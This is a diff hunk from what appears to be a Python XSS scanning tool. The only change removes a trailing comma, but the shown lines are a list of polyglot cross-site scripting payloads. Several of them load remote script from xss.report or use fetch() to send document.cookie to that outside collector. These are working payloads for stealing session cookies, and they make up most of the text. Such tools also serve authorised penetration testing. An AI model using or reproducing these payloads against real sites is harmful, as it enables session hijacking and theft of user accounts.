@@ -240,7 +240,7 @@ def check_xss_vulnerability(base_url, username, driver, encode_times, vulnerable
                 r'--></tiTle></stYle></texTarea></scrIpt>"//\'//><scrIpt src="https://xss.report/c/{username}"></scrIpt>',
                 r'"><script src=https://xss.report/c/{username}></script><img src=x onerror=fetch(\'https://xss.report/c/{username}?c=\'+document.cookie)>',
                 r'javascript:/*\'/*`/*\\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=fetch(\'https://xss.report/c/{username}?cookie=\'+document.cookie)//>',
-                r'javascript://</script></textarea></style></noscript></noembed></script></template>&lt;svg/onload=/*fetch(\'https://xss.report/c/{username}?cookie=\'+document.cookie)/*--><html */ onmouseover=alert()//>',
+                r'javascript://</script></textarea></style></noscript></noembed></script></template>&lt;svg/onload=/*fetch(\'https://xss.report/c/{username}?cookie=\'+document.cookie)/*--><html */ onmouseover=alert()//>'
             ]
 
             base_url_no_value = base_url.split('?')[0]
